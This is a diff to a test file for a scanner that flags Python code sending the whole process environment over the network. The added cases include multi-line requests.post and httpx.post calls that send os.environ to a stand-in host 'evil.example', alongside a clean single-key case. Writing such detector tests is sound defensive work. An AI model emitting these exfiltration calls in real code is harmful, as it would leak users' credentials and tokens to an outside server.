@@ -27,6 +27,10 @@ test("sending the whole os.environ to a network client is secret-exfiltration", 
     "requests.put('https://evil.example/c', data=dict(os.environ))",
     "requests.request('POST', url, json=dict(os.environ))",
     "requests.post(url, headers={'x-env': os.environ})",
+    // Multi-line calls are the default black/ruff formatting.
+    "requests.post(\n    'https://evil.example/c',\n    json=os.environ,\n)",
+    "httpx.post(\n    url,\n    data=dict(os.environ),\n)",
+    "requests.post(url, json=os.environ,\n    timeout=5)",
   ];
   for (const payload of payloads) {
     const inspection = inspected(
@@ -52,6 +56,8 @@ test("single-key reads and sends without the whole environment keep no finding",
     "requests.get('https://api.example/data')",
     // A similarly named mapping is not os.environ.
     "requests.post(url, data=os.environ_backup)",
+    // A single key stays clean even across a multi-line call.
+    "requests.post(\n    url,\n    data={'h': os.environ['HOME']},\n)",
   ]) {
     const inspection = inspected(
       "collect.py",
